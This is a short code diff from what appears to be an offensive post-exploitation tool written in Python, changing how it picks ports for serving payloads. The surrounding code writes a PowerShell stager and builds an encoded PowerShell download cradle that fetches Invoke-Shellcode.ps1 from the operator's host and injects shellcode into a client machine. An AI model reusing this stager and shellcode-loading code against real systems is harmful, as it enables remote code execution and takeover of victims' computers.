@@ -29,7 +29,7 @@ def printListener():
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
         powershellStagerFile.write(windows_powershell_stager)
         powershellStagerFile.close()
-    randoStagerDLPort = random.randint(5000,9000)
+    randoStagerDLPort = FUNCTIONS().randomUnusedPort()
 
     if bindOrReverse == 'm':
         FUNCTIONS().DoServe(manualIP, powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
@@ -133,7 +133,7 @@ def clientUpload(fileToUpload, powershellExec, isExe, json):
     if clientnumber:
         if isExe:
             newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
-            moduleport = random.randint(5000,9000)
+            moduleport = FUNCTIONS().randomUnusedPort()
             FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
             encPowershell = "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(FUNCTIONS().CheckInternet(), moduleport, newpayloadlayout.rstrip(','))
             encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
